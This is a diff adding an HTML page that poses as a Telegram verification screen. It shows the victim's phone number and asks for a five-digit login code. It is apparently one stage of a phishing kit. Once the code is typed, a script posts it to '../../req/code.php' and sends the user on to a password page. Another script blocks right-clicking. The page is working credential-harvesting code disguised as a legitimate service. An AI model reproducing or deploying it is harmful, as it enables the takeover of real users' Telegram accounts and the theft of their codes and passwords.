@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Verify</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+:root {
+    --blue: #5EA3DE;
+    --dark: #1D2733;
+    --ov: #0000001b;
+}
+* {
+    font-family: 'Ubuntu', sans-serif;
+    font-weight: 400;
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    position: relative;
+    color: #fff;
+}
+b { font-weight: 500; }
+html { width: 100vw; height: 100vh; }
+
+body {
+    background: var(--dark);
+    width: 100vw;
+    height: 100vh;
+}
+.container {
+    width: 100%;
+    height: 100%;
+    display: flex;
+    align-items: center;
+    flex-direction: column;
+    padding: 0 20px;
+}
+.bgimg {
+    width: 100%;
+    height: 200px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.bgimg img {
+    width: 150px;
+}
+.container h2 {
+    font-size: 18px;
+    font-weight: 600;
+}
+.kami {
+    margin-top: 20px;
+    font-size: 13px;
+    color: #bcbcbc;
+    text-align: center;
+}
+form {
+    margin-top: 20px;
+    width: 100%;
+    height: 50px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+form .box-input-pin {
+}
+form input {
+    height: 43px;
+    width: 35px;
+    border: 2px solid #7f7f7f;
+    margin: 0px 2px;
+    outline: none;
+    background: none;
+    border-radius: 7px;
+    font-size: 16px;
+    text-align: center;
+    transition: .2s;
+}
+form input:focus {
+    transition: .2s;
+    border: 2px solid var(--blue);
+}
+.container .sms {
+    margin-top: 30px;
+    font-size: 14px;
+    font-weight: 500;
+    color: var(--blue);
+}
+.clear {
+    width: 100%;
+    height: 100%;
+    position: absolute;
+    left: 0;
+    top: 0;
+    z-index: 99;
+    right: 0;
+}
+</style>
+<script type="text/javascript">
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+</script>
+</head>
+<body>
+    <div class="container">
+        <div class="bgimg">
+            <img src="lib/otp.png" alt="">
+        </div>
+        <h2>Enter Code</h2>
+        <p class="kami">We have sent the code for the telegram app <span id="thisPhone"></span></p>
+        <form id="formPin">
+            <div class="box-input-pin">
+                <div class="clear"></div>
+                <input autofocus name="pin1" id="pin1" class="inppin" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
+                <input name="pin2" id="pin2" class="inppin" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
+                <input name="pin3" id="pin3" class="inppin" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
+                <input name="pin4" id="pin4" class="inppin" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
+                <input name="pin5" id="pin5" class="inppin" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
+            </div>
+        </form>
+        <p onclick="window.location.href='./msg.html'" class="sms">Tap to receive the code via SMS</p>
+    </div>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script>
+$(document).ready(function() {
+        $('.clear').click(function() {
+            $('.inppin').val('');
+            $('#pin1').focus();
+        });
+    })
+    $('.inppin').on('input', function(event) {
+        const inputs = $('.inppin');
+        const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
+        if (isAllFilled == true) {
+            $(event.target).blur();
+            sendPin();
+        }
+        const index = inputs.index(this);
+        const currentValue = event.target.value;
+        if (currentValue.length === 1) {
+            if (index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+        } else if (currentValue.length === 0) {
+            if (index > 0) {
+                inputs[index].focus();
+            }
+        }
+    });
+    $('.inppin').on('keydown', function(event) {
+        const inputs = $('.inppin');
+        const key = event.key;
+        const index = inputs.index(this);
+        if (key === 'Backspace' && event.target.value.length === 0) {
+            if (index > 0) {
+                inputs[index - 1].focus();
+            }
+        }
+    });
+</script>
+<script>
+    function sendPin(){
+        $(".load").fadeIn();
+        $.ajax({
+            type: 'POST',
+            url: '../../req/code.php',
+            data: $('#formPin').serialize(),
+            dataType: 'text',
+            success: function(){
+                window.location.href = '../../Password/';
+            }
+        });
+    };
+</script>
+<script>
+var set_item = sessionStorage.getItem("nohp");
+document.getElementById("thisPhone").innerHTML = set_item;
+</script>
+</body>
+</html>
